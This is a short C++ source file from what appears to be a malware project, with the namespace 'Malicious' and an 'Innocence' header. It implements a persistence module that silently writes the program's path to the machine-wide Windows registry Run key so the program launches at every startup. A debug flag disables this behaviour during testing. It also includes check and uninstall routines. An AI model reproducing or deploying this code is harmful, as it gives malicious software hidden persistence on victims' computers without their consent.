#include "ProgramStart.hpp"

#include <system/Registry.hpp>
#include <log/Log.hpp>
#include <common/Innocence.hpp>

namespace Malicious {
	ProgramStartupKey::ProgramStartupKey(const std::string& path)
		:programPath(path) {
#ifndef INNOCENCE_DEBUG
		if(!installed()) {
			LOG << "Installing automatic starting registry key";
			install();
		}
#else
		LOG << "Automatic Run key disabled in DEBUG";
#endif
	}

	ProgramStartupKey::~ProgramStartupKey() {
	}

	void ProgramStartupKey::setPath(const std::string& path) {
		programPath = path;
	}

	bool ProgramStartupKey::installed() {
		System::Registry::Key startKey(System::Registry::localMachine, Common::RUN_KEY_PATH);
		return startKey.isValueExists(Common::RUN_KEY_NAME);
	}

	void ProgramStartupKey::install() {
		System::Registry::Key startKey(System::Registry::localMachine, Common::RUN_KEY_PATH);
		startKey.createValue(Common::RUN_KEY_NAME, programPath);
	}

	void ProgramStartupKey::uninstall() {
		System::Registry::Key startKey(System::Registry::localMachine, Common::RUN_KEY_PATH);
		if(startKey.isValueExists(Common::RUN_KEY_NAME)) {
			startKey.removeValue(Common::RUN_KEY_NAME);
		}
	}
} // Malicious
